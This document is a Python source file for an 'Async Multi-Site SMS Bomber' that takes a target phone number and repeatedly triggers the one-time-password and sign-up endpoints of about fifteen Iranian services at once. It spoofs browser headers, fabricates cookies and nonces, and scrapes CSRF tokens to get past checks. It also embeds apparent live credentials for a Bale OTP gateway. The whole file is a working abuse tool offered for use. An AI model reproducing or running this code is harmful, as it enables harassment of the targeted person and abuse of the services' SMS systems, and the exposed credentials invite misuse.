import asyncio
import platform
import re
import time
import random
import uuid
import string
from typing import Optional, Dict, Any
from colorama import init, Fore, Back, Style
import aiohttp
from otps import BaleOTP

init(autoreset=True)

baleotp = BaleOTP(
    username="NKWijegoURaDsppwOTUTQnSBGFhBmvOI",
    password="BrlAlPSejnxmomKlgdpDmJPFEbdUuExA", 
    url="https://safir.bale.ai"
)


def print_banner() -> None:
    """Print the application banner."""
    print(Fore.YELLOW + r"""
  _____ __  __ ____
 / ____|  \/  / ___|
| (___ | \  / \___ \
 \___ \| |\/| |___) |
 ____) | |  | |____/
|_____/|_|  |_|
""" + Style.RESET_ALL)
    print(Fore.CYAN + "  Creator: " + Fore.MAGENTA + "DECAY")
    print(Fore.CYAN + "  Version: " + Fore.MAGENTA + "2.3")
    print(Fore.CYAN + "  Description: " + Fore.MAGENTA + "Async Multi-Site SMS Bomber")
    print("\n" + "=" * 50 + "\n")


def get_system_info() -> Dict[str, Any]:
    """Get system information."""
    return {
        'system': {
            'os': f"{platform.system()} {platform.release()}",
            'arch': platform.architecture()[0],
            'python': platform.python_version(),
            'machine': platform.machine(),
            'processor': platform.processor(),
            'is_pro': "Professional" if platform.system() == "Windows" and "Pro" in platform.version() else "Standard"
        }
    }


def print_system_info() -> None:
    """Print system information."""
    print(Fore.GREEN + "[BASIC SYSTEM INFORMATION]" + Style.RESET_ALL)
    system_info = get_system_info()

    print(Fore.CYAN + "\n[SYSTEM]" + Style.RESET_ALL)
    print(f"  {Fore.YELLOW}OS:{Fore.WHITE} {system_info['system']['os']}")
    print(f"  {Fore.YELLOW}Edition:{Fore.WHITE} {system_info['system']['is_pro']}")
    print(f"  {Fore.YELLOW}Architecture:{Fore.WHITE} {system_info['system']['arch']}")
    print(f"  {Fore.YELLOW}Machine:{Fore.WHITE} {system_info['system']['machine']}")
    print(f"  {Fore.YELLOW}Processor:{Fore.WHITE} {system_info['system']['processor']}")

    print(Fore.CYAN + "\n[SOFTWARE]" + Style.RESET_ALL)
    print(f"  {Fore.YELLOW}Python Version:{Fore.WHITE} {system_info['system']['python']}")


def normalize_phone_number(phone: str) -> Optional[str]:
    """Normalize phone number to standard format."""
    digits = re.sub(r'[^\d]', '', phone)

    if digits.startswith('9') and len(digits) == 10:
        return '98' + digits
    elif digits.startswith('09') and len(digits) == 11:
        return '98' + digits[1:]
    elif digits.startswith('+98') and len(digits) == 12:
        return digits[1:]
    elif digits.startswith('98') and len(digits) == 12:
        return digits
    else:
        return None


class AsyncSMSBomber:
    """Async SMS Bomber using aiohttp."""
    
    def __init__(self):
        self.session: Optional[aiohttp.ClientSession] = None
        
    async def __aenter__(self):
        self.session = aiohttp.ClientSession()
        return self
        
    async def __aexit__(self, exc_type, exc_val, exc_tb):
        if self.session:
            await self.session.close()
    
    async def _make_request(
        self, 
        method: str, 
        url: str, 
        headers: Optional[Dict[str, str]] = None,
        data: Optional[Any] = None,
        json_data: Optional[Dict[str, Any]] = None,
        params: Optional[Dict[str, Any]] = None,
        cookies: Optional[Dict[str, str]] = None
    ) -> aiohttp.ClientResponse:
        """Make async HTTP request."""
        if not self.session:
            self.session = aiohttp.ClientSession()
            
        kwargs = {
            'headers': headers or {},
            'cookies': cookies or {}
        }
        
        if data:
            kwargs['data'] = data
        if json_data:
            kwargs['json'] = json_data
        if params:
            kwargs['params'] = params
            
        async with self.session.request(method, url, **kwargs) as response:
            return response

    async def otp_bale(self, target_number: str) -> None:
        """Send OTP via Bale."""
        try:
            baleotp.send_otp(str(target_number), ''.join(random.choices(string.digits, k=6)))
            print(Fore.GREEN + "[OTP Bale] " + Fore.WHITE + Back.GREEN + "Request Successful!" + Style.RESET_ALL)
        except Exception as e:
            print(Fore.RED + "[OTP Bale Error] " + Fore.WHITE + Back.RED + f"{str(e)}" + Style.RESET_ALL)

    async def limoome(self, target_number: str) -> None:
        """Send SMS via Limoome."""
        url = "https://my.limoome.com/api/auth/login/otp"
        
        cookies = {
            "_gcl_au": f"1.1.{random.randint(100000000, 999999999)}.{int(time.time())}",
            "lemonadeSessionId": f"{''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=20))}",
            "sess": str(uuid.uuid4()).replace('-', '')
        }

        headers = {
            "authority": "my.limoome.com",
            "accept": "application/json, text/plain, */*",
            "content-type": "application/x-www-form-urlencoded",
            "origin": "https://my.limoome.com",
            "referer": "https://my.limoome.com/enter/",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"
        }

        data = {
            "mobileNumber": target_number[2:],
            "country": 98
        }

        try:
            response = await self._make_request('POST', url, headers=headers, data=data, cookies=cookies)
            
            if response.status == 200:
                result = await response.json()
                if result.get("status") == "success":
                    print(Fore.GREEN + "[Limoome] " + Fore.WHITE + Back.GREEN + "Request Successful!" + Style.RESET_ALL)
                else:
                    print(Fore.RED + "[Limoome Error] " + Fore.WHITE + Back.RED + "API returned failure" + Style.RESET_ALL)
            else:
                print(Fore.RED + "[Limoome Error] " + Fore.WHITE + Back.RED + f"HTTP Status: {response.status}" + Style.RESET_ALL)
        except Exception as e:
            print(Fore.RED + "[Limoome Error] " + Fore.WHITE + Back.RED + f"{str(e)}" + Style.RESET_ALL)

    async def parasteh(self, target_number: str) -> None:
        """Send SMS via Parasteh."""
        url = "https://parasteh.com/wp-admin/admin-ajax.php"

        headers = {
            "authority": "parasteh.com",
            "accept": "*/*",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "origin": "https://parasteh.com",
            "referer": "https://parasteh.com/my-account/",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
            "x-requested-with": "XMLHttpRequest"
        }

        nonce = ''.join(random.choices('abcdef0123456789', k=10))

        payload = {
            "action": "rml_operation",
            "nonce": nonce,
            "data[0][name]": "rml-login-type",
            "data[0][value]": "mobile",
            "data[1][name]": "login-mobile",
            "data[1][value]": target_number[2:],
            "data[2][name]": "rml-mobile-dial-code",
            "data[2][value]": "98",
            "data[3][name]": "rml-mobile-country-code",
            "data[3][value]": "ir",
            "data[4][name]": "rml-operation",
            "data[4][value]": "login",
            "data[5][name]": "rml-redirect",
            "data[5][value]": ""
        }

        try:
            response = await self._make_request('POST', url, headers=headers, data=payload)
            if response.status == 200:
                result = await response.json()
                if result.get("success"):
                    print(Fore.GREEN + "[Parasteh] " + Fore.WHITE + Back.GREEN + "Request Successful!" + Style.RESET_ALL)
                else:
                    print(Fore.RED + "[Parasteh Error] " + Fore.WHITE + Back.RED + "API returned failure" + Style.RESET_ALL)
            else:
                print(Fore.RED + "[Parasteh Error] " + Fore.WHITE + Back.RED + f"HTTP Status: {response.status}" + Style.RESET_ALL)
        except Exception as e:
            print(Fore.RED + "[Parasteh Error] " + Fore.WHITE + Back.RED + f"{str(e)}" + Style.RESET_ALL)

    async def sms_ir(self, target_number: str) -> None:
        """Send SMS via SMS.ir."""
        url = "https://appapi.sms.ir/api/app/auth/sign-up/verification-code"

        headers = {
            "authority": "appapi.sms.ir",
            "accept": "application/json, text/plain, */*",
            "content-type": "application/json",
            "origin": "https://app.sms.ir",
            "referer": "https://app.sms.ir/",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
            "sec-ch-ua": '"Not)A;Brand";v="8", "Chromium";v="138", "Google Chrome";v="138"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"'
        }

        data = {
            "mobile": target_number[2:]
        }

        try:
            response = await self._make_request('POST', url, headers=headers, json_data=data)
            if response.status == 200:
                print(Fore.GREEN + "[SMS.ir] " + Fore.WHITE + Back.GREEN + "Request Successful!" + Style.RESET_ALL)
            else:
                print(Fore.RED + "[SMS.ir Error] " + Fore.WHITE + Back.RED + f"HTTP Status: {response.status}" + Style.RESET_ALL)
        except Exception as e:
            print(Fore.RED + "[SMS.ir Error] " + Fore.WHITE + Back.RED + f"{str(e)}" + Style.RESET_ALL)

    async def riceonline(self, target_number: str) -> None:
        """Send SMS via RiceOnline."""
        url = "https://www.riceonline.ir/wp-admin/admin-ajax.php"

        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
            "Origin": "https://www.riceonline.ir",
            "Referer": "https://www.riceonline.ir/",
            "X-Requested-With": "XMLHttpRequest"
        }

        data = {
            "action": "chapar-check-user",
            "username": target_number,
            "isp": "",
            "resend": "false",
            "security": "a26911415e"
        }

        try:
            response = await self._make_request('POST', url, headers=headers, data=data)
            if response.status == 200:
                print(Fore.GREEN + "[RiceOnline] " + Fore.WHITE + Back.GREEN + "Request Successful!" + Style.RESET_ALL)
            else:
                print(Fore.RED + "[RiceOnline Error] " + Fore.WHITE + Back.RED + f"HTTP Status: {response.status}" + Style.RESET_ALL)
        except Exception as e:
            print(Fore.RED + "[RiceOnline Error] " + Fore.WHITE + Back.RED + f"{str(e)}" + Style.RESET_ALL)

    async def okcs(self, target_number: str) -> None:
        """Send SMS via OKCS."""
        try:
            init_url = "https://shop.okcs.com/category/iranian-rice"
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"
            }
            
            response = await self._make_request('GET', init_url, headers=headers)
            if response.status != 200:
                print(Fore.RED + "[Okcs Error] " + Fore.WHITE + Back.RED + "Failed to initialize session" + Style.RESET_ALL)
                return

            cookies = response.cookies
            csrf_token = ""
            for cookie in cookies.values():
                if 'XSRF-TOKEN' in str(cookie):
                    csrf_token = str(cookie).replace('%3D', '=')

            url = "https://shop.okcs.com/livewire/message/otp"
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
                "Origin": "https://shop.okcs.com",
                "Referer": "https://shop.okcs.com/category/iranian-rice",
                "X-Requested-With": "XMLHttpRequest",
                "X-CSRF-TOKEN": csrf_token,
                "X-Livewire": "true",
                "Content-Type": "application/json"
            }

            payload = {
                "fingerprint": {
                    "id": "",
                    "name": "otp",
                    "locale": "fa",
                    "path": "category/iranian-rice",
                    "method": "GET",
                    "v": "acj"
                },
                "serverMemo": {
                    "children": [],
                    "errors": [],
                    "htmlHash": "",
                    "data": {
                        "mobile": None,
                        "token": None
                    },
                    "dataMeta": [],
                    "checksum": ""
                },
                "updates": [
                    {
                        "type": "syncInput",
                        "payload": {
                            "id": "6ih",
                            "name": "mobile",
                            "value": f"0{target_number[2:]}"
                        }
                    },
                    {
                        "type": "callMethod",
                        "payload": {
                            "id": "",
                            "method": "sendOTP",
                            "params": []
                        }
                    }
                ]
            }

            response = await self._make_request('POST', url, headers=headers, json_data=payload)
            if response.status == 200:
                print(Fore.GREEN + "[Okcs (افق کوروش)] " + Fore.WHITE + Back.GREEN + "Request Successful!" + Style.RESET_ALL)
            else:
                print(Fore.RED + "[Okcs Error] " + Fore.WHITE + Back.RED + f"HTTP Status: {response.status}" + Style.RESET_ALL)
        except Exception as e:
            print(Fore.RED + "[Okcs Error] " + Fore.WHITE + Back.RED + f"{str(e)}" + Style.RESET_ALL)

    async def caspianrice(self, target_number: str) -> None:
        """Send SMS via CaspianRice."""
        try:
            login_url = "https://caspianrice.com/login-signup/"
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
                "Accept": "text/html,application/xhtml+xml",
                "Referer": "https://caspianrice.com/"
            }

            response = await self._make_request('GET', login_url, headers=headers)
            if response.status != 200:
                print(Fore.RED + "[CaspianRice Error] " + Fore.WHITE + Back.RED + "Failed to initialize session" + Style.RESET_ALL)
                return

            response_text = await response.text()
            nonce = None
            match = re.search(r'name="_wpnonce" value="([^"]+)"', response_text)
            if match:
                nonce = match.group(1)

            if not nonce:
                print(Fore.RED + "[CaspianRice Error] " + Fore.WHITE + Back.RED + "Failed to get nonce" + Style.RESET_ALL)
                return

            secret = ""
            url = f"https://caspianrice.com/hoopi-api/check-username/?username={target_number}&sendBy=sms&secret={secret}"

            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
                "Accept": "application/json, text/plain, */*",
                "Referer": "https://caspianrice.com/login-signup/",
                "Origin": "https://caspianrice.com",
                "X-WP-Nonce": nonce,
                "X-ISP": ""
            }

            response = await self._make_request('GET', url, headers=headers)
            if response.status == 200:
                result = await response.json()
                if result.get("success", False):
                    print(Fore.GREEN + "[CaspianRice] " + Fore.WHITE + Back.GREEN + "Request Successful!" + Style.RESET_ALL)
                else:
                    print(Fore.RED + "[CaspianRice Error] " + Fore.WHITE + Back.RED + "API returned failure" + Style.RESET_ALL)
            else:
                print(Fore.RED + "[CaspianRice Error] " + Fore.WHITE + Back.RED + f"HTTP Status: {response.status}" + Style.RESET_ALL)
        except Exception as e:
            print(Fore.RED + "[CaspianRice Error] " + Fore.WHITE + Back.RED + f"{str(e)}" + Style.RESET_ALL)

    async def safir_bale(self, target_number: str) -> None:
        """Send SMS via Safir Bale."""
        url = "https://safir.bale.ai/api/internal/gateway/send-otp"

        headers = {
            "authority": "safir.bale.ai",
            "accept": "application/json, text/plain, */*",
            "content-type": "application/json",
            "origin": "https://safir.bale.ai",
            "referer": "https://safir.bale.ai/",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
            "sec-ch-ua": '"Not)A;Brand";v="8", "Chromium";v="138", "Microsoft Edge";v="138"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"'
        }

        data = {
            "phone_number": target_number
        }

        try:
            response = await self._make_request('POST', url, headers=headers, json_data=data)
            if response.status == 200:
                result = await response.json()
                if "transaction_hash" in result:
                    print(Fore.GREEN + "[Safir Bale] " + Fore.WHITE + Back.GREEN + "Request Successful!" + Style.RESET_ALL)
                else:
                    print(Fore.RED + "[Safir Bale Error] " + Fore.WHITE + Back.RED + "API returned failure" + Style.RESET_ALL)
            else:
                print(Fore.RED + "[Safir Bale Error] " + Fore.WHITE + Back.RED + f"HTTP Status: {response.status}" + Style.RESET_ALL)
        except Exception as e:
            print(Fore.RED + "[Safir Bale Error] " + Fore.WHITE + Back.RED + f"{str(e)}" + Style.RESET_ALL)

    async def ads_bale(self, target_number: str) -> None:
        """Send SMS via ADS Bale."""
        url = "https://tablighapi.bale.ai/RequestOTP"

        headers = {
            "authority": "tablighapi.bale.ai",
            "accept": "application/json, text/plain, */*",
            "origin": "https://tabligh.bale.ai",
            "referer": "https://tabligh.bale.ai/",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
            "sec-ch-ua": '"Not)A;Brand";v="8", "Chromium";v="138", "Google Chrome";v="138"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "phone": target_number[2:]
        }

        try:
            response = await self._make_request('GET', url, headers=headers)
            if response.status == 200:
                result = await response.json()
                if "TransactionHash" in result:
                    print(Fore.GREEN + "[ADS Bale] " + Fore.WHITE + Back.GREEN + "Request Successful!" + Style.RESET_ALL)
                else:
                    print(Fore.RED + "[ADS Bale Error] " + Fore.WHITE + Back.RED + "API returned failure" + Style.RESET_ALL)
            else:
                print(Fore.RED + "[ADS Bale Error] " + Fore.WHITE + Back.RED + f"HTTP Status: {response.status}" + Style.RESET_ALL)
        except Exception as e:
            print(Fore.RED + "[ADS Bale Error] " + Fore.WHITE + Back.RED + f"{str(e)}" + Style.RESET_ALL)

    async def my_eitaa(self, target_number: str) -> None:
        """Send SMS via MY Eitaa."""
        url = "https://my.eitaa.com/api/v1/loginByEitaa"

        phone = target_number[2:] if target_number.startswith('98') else target_number
        phone = f"0{phone}" if len(phone) == 10 else phone

        headers = {
            "authority": "my.eitaa.com",
            "accept": "application/json, text/plain, */*",
            "content-type": "application/json",
            "origin": "https://my.eitaa.com",
            "referer": "https://my.eitaa.com/",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
            "sec-ch-ua": '"Not)A;Brand";v="8", "Chromium";v="138", "Google Chrome";v="138"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "x-ratelimit-limit": "10",
            "x-ratelimit-remaining": "9"
        }

        data = {
            "phone": phone
        }

        try:
            init_response = await self._make_request('GET', "https://my.eitaa.com/", headers={
                "User-Agent": headers["user-agent"]
            })

            if init_response.status != 200:
                print(Fore.RED + "[MY Eitaa Error] " + Fore.WHITE + Back.RED + "Failed to initialize session" + Style.RESET_ALL)
                return

            response = await self._make_request('POST', url, headers=headers, json_data=data)

            if response.status == 200:
                result = await response.json()
                if result.get("ok") and result.get("code") == 200:
                    print(Fore.GREEN + "[MY Eitaa] " + Fore.WHITE + Back.GREEN + "Request Successful!" + Style.RESET_ALL)
                else:
                    print(Fore.RED + "[MY Eitaa Error] " + Fore.WHITE + Back.RED + result.get("message", "Unknown error") + Style.RESET_ALL)
            else:
                print(Fore.RED + "[MY Eitaa Error] " + Fore.WHITE + Back.RED + f"HTTP Status: {response.status}" + Style.RESET_ALL)
        except Exception as e:
            print(Fore.RED + "[MY Eitaa Error] " + Fore.WHITE + Back.RED + f"{str(e)}" + Style.RESET_ALL)

    async def snapp(self, target_number: str) -> None:
        """Send SMS via Snapp."""
        headers = {
            "Host": "app.snapp.taxi",
            "content-length": "29",
            "x-app-name": "passenger-pwa",
            "x-app-version": "5.0.0",
            "app-version": "pwa",
            "user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36",
            "content-type": "application/json",
            "accept": "*/*",
            "origin": "https://app.snapp.taxi",
            "sec-fetch-site": "same-origin",
            "sec-fetch-mode": "cors",
            "sec-fetch-dest": "empty",
            "referer": "https://app.snapp.taxi/login/?redirect_to=%2F",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "fa-IR,fa;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6",
            "cookie": "_gat=1"
        }

        data = {
            "cellphone": target_number[2:] if target_number.startswith('98') else target_number
        }

        try:
            response = await self._make_request(
                'POST',
                "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp",
                headers=headers,
                json_data=data
            )

            if response.status == 200 and "OK" in await response.text():
                print(Fore.GREEN + "[Snapp] " + Fore.WHITE + Back.GREEN + "Request Successful!" + Style.RESET_ALL)
            else:
                print(Fore.RED + "[Snapp Error] " + Fore.WHITE + Back.RED + f"HTTP Status: {response.status}" + Style.RESET_ALL)
        except Exception as e:
            print(Fore.RED + "[Snapp Error] " + Fore.WHITE + Back.RED + f"{str(e)}" + Style.RESET_ALL)

    async def shad(self, target_number: str) -> None:
        """Send SMS via Shad."""
        headers = {
            "Host": "shadmessenger12.iranlms.ir",
            "content-length": "96",
            "accept": "application/json, text/plain, */*",
            "user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36",
            "content-type": "text/plain",
            "origin": "https://shadweb.iranlms.ir",
            "sec-fetch-site": "same-site",
            "sec-fetch-mode": "cors",
            "sec-fetch-dest": "empty",
            "referer": "https://shadweb.iranlms.ir/",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "fa-IR,fa;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6"
        }

        data = {
            "api_version": "3",
            "method": "sendCode",
            "data": {
                "phone_number": target_number[1:] if target_number.startswith('+') else target_number,
                "send_type": "SMS"
            }
        }

        try:
            response = await self._make_request(
                'POST',
                "https://shadmessenger12.iranlms.ir/",
                headers=headers,
                json_data=data
            )

            if response.status == 200 and "OK" in await response.text():
                print(Fore.GREEN + "[Shad] " + Fore.WHITE + Back.GREEN + "Request Successful!" + Style.RESET_ALL)
            else:
                print(Fore.RED + "[Shad Error] " + Fore.WHITE + Back.RED + f"HTTP Status: {response.status}" + Style.RESET_ALL)
        except Exception as e:
            print(Fore.RED + "[Shad Error] " + Fore.WHITE + Back.RED + f"{str(e)}" + Style.RESET_ALL)

    async def gap(self, target_number: str) -> None:
        """Send SMS via Gap."""
        headers = {
            "Host": "core.gap.im",
            "accept": "application/json, text/plain, */*",
            "x-version": "4.5.7",
            "accept-language": "fa",
            "user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36",
            "appversion": "web",
            "origin": "https://web.gap.im",
            "sec-fetch-site": "same-site",
            "sec-fetch-mode": "cors",
            "sec-fetch-dest": "empty",
            "referer": "https://web.gap.im/",
            "accept-encoding": "gzip, deflate, br"
        }
        try:
            response = await self._make_request('GET', f"https://core.gap.im/v1/user/add.json?mobile=%2B{target_number[1:]}", headers=headers)
            if "OK" in await response.text():
                print(Fore.GREEN + "[Gap] " + Fore.WHITE + Back.GREEN + "Request Successful!" + Style.RESET_ALL)
            else:
                print(Fore.RED + "[Gap Error] " + Fore.WHITE + Back.RED + "API returned failure" + Style.RESET_ALL)
        except Exception as e:
            print(Fore.RED + "[Gap Error] " + Fore.WHITE + Back.RED + f"{str(e)}" + Style.RESET_ALL)

    async def tap30(self, target_number: str) -> None:
        """Send SMS via Tap30."""
        headers = {
            "Host": "tap33.me",
            "Connection": "keep-alive",
            "Content-Length": "63",
            "User-Agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36",
            "content-type": "application/json",
            "Accept": "*/*",
            "Origin": "https://app.tapsi.cab",
            "Sec-Fetch-Site": "cross-site",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Dest": "empty",
            "Referer": "https://app.tapsi.cab/",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "fa-IR,fa;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6"
        }
        data = {
            "credential": {
                "phoneNumber": f"0{target_number[2:]}",
                "role": "PASSENGER"
            }
        }
        try:
            response = await self._make_request('POST', "https://tap33.me/api/v2/user", headers=headers, json_data=data)
            if "OK" in await response.text():
                print(Fore.GREEN + "[Tap30] " + Fore.WHITE + Back.GREEN + "Request Successful!" + Style.RESET_ALL)
            else:
                print(Fore.RED + "[Tap30 Error] " + Fore.WHITE + Back.RED + "API returned failure" + Style.RESET_ALL)
        except Exception as e:
            print(Fore.RED + "[Tap30 Error] " + Fore.WHITE + Back.RED + f"{str(e)}" + Style.RESET_ALL)

    async def emtiaz(self, target_number: str) -> None:
        """Send SMS via Emtiaz."""
        headers = {
            "Host": "web.emtiyaz.app",
            "Connection": "keep-alive",
            "Content-Length": "28",
            "Cache-Control": "max-age=0",
            "Upgrade-Insecure-Requests": "1",
            "Origin": "https://web.emtiyaz.app",
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-User": "?1",
            "Sec-Fetch-Dest": "document",
            "Referer": "https://web.emtiyaz.app/register",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "fa-IR,fa;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6"
        }
        data = {
            "phone": f"0{target_number[2:]}"
        }
        try:
            response = await self._make_request('POST', "https://web.emtiyaz.app/register", headers=headers, data=data)
            if response.status == 200:
                print(Fore.GREEN + "[Emtiaz] " + Fore.WHITE + Back.GREEN + "Request Successful!" + Style.RESET_ALL)
            else:
                print(Fore.RED + "[Emtiaz Error] " + Fore.WHITE + Back.RED + f"HTTP Status: {response.status}" + Style.RESET_ALL)
        except Exception as e:
            print(Fore.RED + "[Emtiaz Error] " + Fore.WHITE + Back.RED + f"{str(e)}" + Style.RESET_ALL)

    async def run_all_services(self, target_number: str, count: int, delay: float) -> None:
        """Run all SMS services concurrently."""
        services = [
            self.otp_bale, self.limoome, self.parasteh, self.sms_ir, self.riceonline,
            self.okcs, self.caspianrice, self.safir_bale, self.ads_bale, self.my_eitaa,
            self.snapp, self.shad, self.gap, self.tap30, self.emtiaz
        ]

        for i in range(count):
            print(Fore.CYAN + f"\n[ROUND {i + 1}/{count}]" + Style.RESET_ALL)
            
            tasks = [service(target_number) for service in services]
            await asyncio.gather(*tasks, return_exceptions=True)
            
            if i < count - 1:
                print(Fore.YELLOW + f"\nWaiting {delay} seconds before next round..." + Style.RESET_ALL)
                await asyncio.sleep(delay)


async def main() -> None:
    """Main async function."""
    print_banner()
    print_system_info()
    
    target_number = input(Fore.CYAN + "\n[?] Enter target number: " + Style.RESET_ALL)
    normalized_number = normalize_phone_number(target_number)
    
    if not normalized_number:
        print(Fore.RED + "[ERROR] Invalid phone number format!" + Style.RESET_ALL)
        return
    
    try:
        count = int(input(Fore.CYAN + "[?] Enter number of rounds: " + Style.RESET_ALL))
        delay = float(input(Fore.CYAN + "[?] Enter delay between rounds (seconds): " + Style.RESET_ALL))
    except ValueError:
        print(Fore.RED + "[ERROR] Invalid input for count or delay!" + Style.RESET_ALL)
        return
    
    print(Fore.GREEN + f"\n[INFO] Starting attack on {normalized_number} for {count} rounds with {delay}s delay" + Style.RESET_ALL)
    
    async with AsyncSMSBomber() as bomber:
        await bomber.run_all_services(normalized_number, count, delay)
    
    print(Fore.GREEN + "\n[COMPLETE] All rounds finished!" + Style.RESET_ALL)


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print(Fore.RED + "\n[INTERRUPTED] Process stopped by user" + Style.RESET_ALL)
    except Exception as e:
        print(Fore.RED + f"\n[ERROR] {str(e)}" + Style.RESET_ALL)